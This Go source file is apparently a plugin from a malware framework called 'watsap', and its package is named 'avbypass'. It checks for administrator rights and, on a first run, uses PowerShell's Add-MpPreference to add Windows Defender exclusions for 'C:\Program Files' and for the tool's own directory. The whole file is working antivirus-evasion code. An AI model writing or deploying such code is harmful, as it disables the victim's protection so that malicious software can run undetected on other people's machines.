//go:build windows

package avbypass

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"watsap/utils/config"
)

// var customAVName = "'Windows Defender Antivirus'"
var powershellPath string
var defenderExclusions = []string{
	"C:\\Program Files",
	config.WaDir,
}

func init() {
	log.Println("Bypass-AV Plugin initialized.")
	if err := checkPowerShell(); err != nil {
		log.Printf("ERROR: Initialization failed: %v", err)
	}
}

func isAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err == nil
}

func checkPowerShell() error {
	// FIX: We use 'path' here to avoid shadowing the global 'powershellPath' variable.
	path, err := exec.LookPath("powershell")
	if err != nil {
		return fmt.Errorf("powershell not found in system")
	}
	powershellPath = path
	log.Printf("PowerShell found at: %s", powershellPath)
	return nil
}

func Main() {
	if powershellPath == "" {
		log.Println("PowerShell path is missing. Aborting operation.")
		return
	}

	if isAdmin() && config.FirstRun {
		AddDefenderExclusions()

		log.Println("Defender exclusions added locally.")
	}
}

func AddDefenderExclusions() {
	log.Println("Attempting to add Defender exclusions...")
	for _, path := range defenderExclusions {
		if path == "" {
			continue
		}
		psCommand := fmt.Sprintf("Add-MpPreference -ExclusionPath '%s' -Force", path)

		cmd := exec.Command(powershellPath, "-NoProfile", "-Command", psCommand)
		output, err := cmd.CombinedOutput()

		if err != nil {
			log.Printf("Failed to add exclusion: %s | Error: %s", path, string(output))
		} else {
			log.Printf("Successfully added exclusion: %s", path)
		}
	}
}
